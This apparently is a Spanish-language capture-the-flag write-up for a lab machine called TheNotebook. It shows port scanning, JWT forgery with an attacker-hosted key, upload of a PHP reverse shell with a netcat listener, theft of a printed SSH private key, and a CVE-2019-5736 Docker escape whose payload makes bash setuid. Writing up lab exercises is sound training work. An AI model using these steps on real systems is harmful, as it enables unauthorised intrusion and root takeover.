![[Pasted image 20241006211411.png]]

**Linux**
**MEDIUM**
**Tags:** #JWT 
https://github.com/Gorkaaaa

---

# Enumeración
1. Comprobamos conectividad.
```R
❯ ping -c 1 10.10.10.230
PING 10.10.10.230 (10.10.10.230) 56(84) bytes of data.
64 bytes from 10.10.10.230: icmp_seq=1 ttl=63 time=113 ms

--- 10.10.10.230 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 113.314/113.314/113.314/0.000 ms
```
*Vemos que tenemos conectividad con la máquina victima.*

2. Enumeración de puertos.
```R
❯ sudo nmap -p- --min-rate 5000 -sS -T5 -Pn -n 10.10.10.230 -oG AllPorts
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
10010/tcp filtered rxapi
```
*Podemos ver 2 puertos abiertos básicos.*

```R
❯ extractPorts AllPorts
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.230
   5   │     [*] Open ports: 22,80
   7   │ [*] Ports copied to clipboard
```
*Con esta funcion nos copiamos los puertos en la clipboard...*

```R
❯ sudo nmap -p22,80 -sCV 10.10.10.230 -oG targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-06 17:18 EDT
Nmap scan report for 10.10.10.230
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
*Ahora podemos ver la información de cada puerto.*

3. Puerto 80
```R
❯ whatweb http://10.10.10.230 -v
WhatWeb report for http://10.10.10.230
Status    : 200 OK
Title     : The Notebook - Your Note Keeper
IP        : 10.10.10.230
Country   : RESERVED, ZZ

Summary   : Bootstrap, HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], nginx[1.14.0]

Detected Plugins:
[ Bootstrap ]
	Bootstrap is an open source toolkit for developing with 
	HTML, CSS, and JS. 

	Website     : https://getbootstrap.com/

[ HTML5 ]
	HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Ubuntu Linux
	String       : nginx/1.14.0 (Ubuntu) (from server string)

[ nginx ]
	Nginx (Engine-X) is a free, open-source, high-performance 
	HTTP server and reverse proxy, as well as an IMAP/POP3 
	proxy server. 

	Version      : 1.14.0
	Website     : http://nginx.net/

HTTP Headers:
	HTTP/1.1 200 OK
	Server: nginx/1.14.0 (Ubuntu)
	Date: Sun, 06 Oct 2024 19:21:35 GMT
	Content-Type: text/html; charset=utf-8
	Transfer-Encoding: chunked
	Connection: close
	Content-Encoding: gzip
```
*Podemos ver las tecnolgias con las que trbaja.*

![[Pasted image 20241006212734.png]]
*Podemos ver esta interfaz y ahora probaremos algunas cosas.*

![[Pasted image 20241006212806.png]]
*Nos creamos una cuenta...*

![[Pasted image 20241006212829.png]]
*Ahora podemos ver esta sección, ya nos ha iniciado sesion de forma automatica.*

![[Pasted image 20241006213327.png]]
*Si vemos la cookie que se esta empleando podemos sospechar de algo...*

![[Pasted image 20241006213428.png]]
*Efectivamente vemos que se esta aplicando jwt...*

```R
❯ openssl genrsa -out privKey.key 2048
❯ cat privKey.key | xclip -sel clip
```
*Creamos una clave privada y la copiamos para poder pegarla en la página.*

![[Pasted image 20241006214018.png]]
*Vemos que una vez copiada podemos modificar los parametros...*

```R
❯ sudo python3 -m http.server 80
```
*Nos abrmos un servidor de python...*

```R
❯ sudo python3 -m http.server 80
[sudo] password for user: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.230 - - [06/Oct/2024 17:49:02] "GET /privKey.key HTTP/1.1" 200 -
```
*Podemos ver que nos ha llegado la solicitud.*

![[Pasted image 20241006214935.png]]
*Vemos que nos ha dado un panel de administrdor.*

![[Pasted image 20241006215009.png]]
*Tenemos un posbile usuario...*

![[Pasted image 20241006215042.png]]
*Vemos que reportan que se peude ejecutar codigo repoto de php.*

![[Pasted image 20241006215102.png]]
*Justo vemos que podemos subir cosas...*

```R
❯ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
```
*Nos copiamos este recurso...*

```r
  49   │ $ip = '127.0.0.1';  // CHANGE THIS
  50   │ $port = 1234;       // CHANGE THIS
```
*Cambiamos estos dos parametros...*

```R
❯ sudo nc -nlvp 443
```
*Nos abrimos un lister por el puerto 443*

# Explotación

![[Pasted image 20241006215658.png]]
*Ahora vemos que lo hemos subido...*

```R
$ whoami
www-data
```
*Vemos que hemos conseguido acceso al servidor...*

```R
$ script -c bash /dev/null
❯ stty raw -echo;fg
		reset xterm
www-data@thenotebook:/$ export TERM=xterm
```
*Ahora ya tenemos una tty funcional.*

```R
www-data@thenotebook:/var/backups$ ls
apt.extended_states.0	 apt.extended_states.2.gz  home.tar.gz
apt.extended_states.1.gz  apt.extended_states.3.gz

www-data@thenotebook:/var/backups$ cp ./home.tar.gz /tmp/
```
*Ahora vemos que tenemos la carpeta copiada en el  /tmp/*

```R
www-data@thenotebook:/tmp$ tar -xf home.tar.gz
```
*Extraemos el contenido...*

```R
www-data@thenotebook:/tmp/home/noah/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04
HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT
rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b
HVo4kvIHT0IXveAivxez3UpiulFkaQ4zk37rfHO3wuTWsyZ0vmL7gr3fQRBndrUD
v4k2zwetxYNt0hjdLDyA+KGWFFeW7ey9ynrMKW2ic2vBucEAUUe+mb0EazO2inhX
rTAQEgTrbO7jNoZEpf4MDRt7DTQ7dRz+k8HG4wIDAQABAoIBAQDIa0b51Ht84DbH
+UQY5+bRB8MHifGWr+4B6m1A7FcHViUwISPCODg6Gp5o3v55LuKxzPYPa/M0BBaf
Q9y29Nx7ce/JPGzAiKDGvH2JvaoF22qz9yQ5uOEzMMdpigS81snsV10gse1bQd4h
CA4ehjzUultDO7RPlDtbZCNxrhwpmBMjCjQna0R2TqPjEs4b7DT1Grs9O7d7pyNM
Um/rxjBx7AcbP+P7LBqLrnk7kCXeZXbi15Lc9uDUS2c3INeRPmbFl5d7OdlTbXce
YwHVJckFXyeVP6Qziu3yA3p6d+fhFCzWU3uzUKBL0GeJSARxISsvVRzXlHRBGU9V
AuyJ2O4JAoGBAO67RmkGsIAIww/DJ7fFRRK91dvQdeaFSmA7Xf5rhWFymZ/spj2/
rWuuxIS2AXp6pmk36GEpUN1Ea+jvkw/NaMPfGpIl50dO60I0B4FtJbood2gApfG9
0uPb7a+Yzbj10D3U6AnDi0tRtFwnnyfRevS+KEFVXHTLPTPGjRRQ41OdAoGBANlU
kn7eFJ04BYmzcWbupXaped7QEfshGMu34/HWl0/ejKXgVkLsGgSB5v3aOlP6KqEE
vk4wAFKj1i40pEAp0ZNawD5TsDSHoAsIxRnjRM+pZ2bjku0GNzCAU82/rJSnRA+X
i7zrFYhfaKldu4fNYgHKgDBx8X/DeD0vLellpLx/AoGBANoh0CIi9J7oYqNCZEYs
QALx5jilbzUk0WLAnA/eWs9BkVFpQDTnsSPVWscQLqWk7+zwIqq0v6iN3jPGxA8K
VxGyB2tGqt6jI58oPztpabGBTCmBfh82nT2KNNHfwwmfwZjdsu9I9zvo+e3CXlBZ
vglmvw2DW6l0EwX+A+ZuSmiZAoGAb2mgtDMrRDHc/Oul3gvHfV6CYIwwO5qK+Jyr
2WWWKla/qaWo8yPQbrEddtOyBS0BP4yL9s86yyK8gPFxpocJrk3esdT7RuKkVCPJ
z2yn8QE6Rg+yWZpPHqkazSZO1eItzQR2mYG2hzPKFtE7evH6JUrnjm5LTKEreco+
8iCuZAcCgYEA1fhcJzNwEUb2EOV/AI23rYpViF6SiDTfJrtV6ZCLTuKKhdvuqkKr
JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+
Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
-----END RSA PRIVATE KEY-----
```
*Podemos ver que podemos obtener la id_rsa de noah.*

```R
❯ ll
.rw-r--r-- user user 1.6 KB Sun Oct  6 18:06:53 2024 󰷖 id_rsa

❯ chmod 600 id_rsa
```
*Nos la traemos y le damos permisos para poder utilizarla...*

```R
❯ ssh -i id_rsa noah@10.10.10.230
noah@thenotebook:~$ export TERM=xterm
```
*Ahroa podemos ver que nos hemos conseguido conectar correctamente como noah*

```R
noah@thenotebook:~$ cat user.txt
1e3b3cf9ea29bea33d72972f16733e6d
```
*Ahora podemos ver que tenemos la user flag...*

# Escalada
1. Docker 
```R
noah@thenotebook:~$ sudo -l
(ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```
*Vemos que podemos ejecutar como sudo...*

```R
noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 bash
root@0f4c2517af40:/opt/webapp# whoami
root
```
*Vemos que hemos obtenido root pero del docker.*

```R
noah@thenotebook:~$ docker --version
Docker version 18.06.0-ce, build 0ffa825
```
*Podemos ver la version de docker...*

```R
https://github.com/Frichetten/CVE-2019-5736-PoC
```
*Podemos ver en este repositorio un exploit para el docker...*

```R
❯ wget https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/refs/heads/master/main.go
```
*Nos lo descargamos...*

```R
❯ cat -l java main.go
26   │     var payload = "#!/bin/bash \n chmod u+s /bin/bash"
```
*Ahora le cambiamos para que nos de la shell de forma privilegiada.*

```R
❯ go build -ldflags "-s -w" main.go
❯ ll
.rwxr-xr-x user user 1.4 MB Sun Oct  6 18:20:29 2024  main
```
*Ahora compilamos el .go*

```R
❯ sudo python3 -m http.server 334
Serving HTTP on 0.0.0.0 port 334 (http://0.0.0.0:334/) ...
```
*Abrimos un lister con python...*

```R
root@0f4c2517af40:/opt/webapp cd /tmp/
root@0f4c2517af40:/tmp# chmod +x main
```
*Desde la máquina victima nos lo traemos...*

```R
root@0f4c2517af40:/tmp# ./main
[+] Overwritten /bin/sh successfully
```
*Ahora hemos conseguido ejecutar el exploit de fomra correcta...*

```R
noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
# cat /root/root
```
*Ahora agregando esto nos tenemos que conectar como root.*


